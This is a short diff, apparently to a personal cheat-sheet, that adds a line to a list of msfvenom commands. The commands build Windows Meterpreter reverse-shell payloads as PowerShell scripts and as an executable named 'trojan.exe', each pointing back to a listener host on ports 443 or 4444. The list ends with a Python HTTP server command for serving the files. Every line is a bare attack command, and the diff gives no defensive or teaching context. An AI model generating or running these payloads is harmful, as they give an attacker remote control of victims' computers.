@@ -8,7 +8,10 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<seu_ip> LPORT=443 -f ex
 
 msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1
 
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.137 LPORT=4444 -f psh > payload.ps1
+
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f exe > trojan.exe
+
 
 python3 -m http.server 8080
 
